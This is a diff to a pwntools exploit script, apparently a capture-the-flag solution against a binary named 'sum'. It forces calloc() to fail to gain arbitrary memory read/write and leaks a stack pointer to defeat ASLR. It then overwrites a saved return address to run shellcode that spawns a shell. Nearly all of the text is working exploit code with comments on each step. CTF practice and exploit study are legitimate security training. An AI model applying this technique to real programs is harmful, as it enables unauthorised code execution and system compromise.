@@ -53,6 +53,10 @@ io = start()
 # flag = io.recv(...)
 # log.success(flag)
 
+def read_prompt():
+    x = io.recvuntil("\n> ")
+    print(x)
+
 # Address of the 'author' global variable (fixed).
 #   $ objdump -D ./sum | grep author
 author_addr = 0x4040a0
@@ -62,28 +66,28 @@ payload = asm(shellcraft.sh())
 if len(payload) % 8 != 0:
     payload = '\x90'*(8 - (len(payload) % 8)) + payload
 
-# Pointer to the stack location where the return address from calculator()
-# is stored (RIP saved from main). Observed with GDB.
-ptr_to_calculator_ret_addr = 0x7fffffffe7e8
+# Read the initial prompt.
+read_prompt()
 
-# Cause calloc() to fail by passing a giant value.
+# Cause calloc() to fail by passing a huge value.
 # The program does not check that calloc() does not return NULL.
 io.sendline('-1')
+read_prompt()
 # Now we can read/write the whole process memory using get/set
 # commands.
 
-# Drain program stdout (and echo it for the ease of debugging).
-msg = io.recv()
-print(msg)
-
+# Use a get command to read the value stored in the 'author' variable.
+# This is a pointer to a calculator() local variable. It's an information
+# leak that allows us to workaround ASLR.
 read_index = author_addr/8
 cmd = 'get %lu' % (read_index)
 print(cmd)
 io.sendline(cmd)
-msg = io.recv()
-print(msg)
-name_addr_int64_str = msg[:msg.find('\n')]
-name_addr_int64 = int(name_addr_int64_str)
+strval = io.recvline()
+read_prompt()
+name_addr_int64 = int(strval)
+print("Leaked address is: %x" % name_addr_int64)
+ptr_to_calculator_ret_addr = name_addr_int64 + 44
 
 # Overwrite the return address. If the stack is executable we
 # set the return address to point right below the location
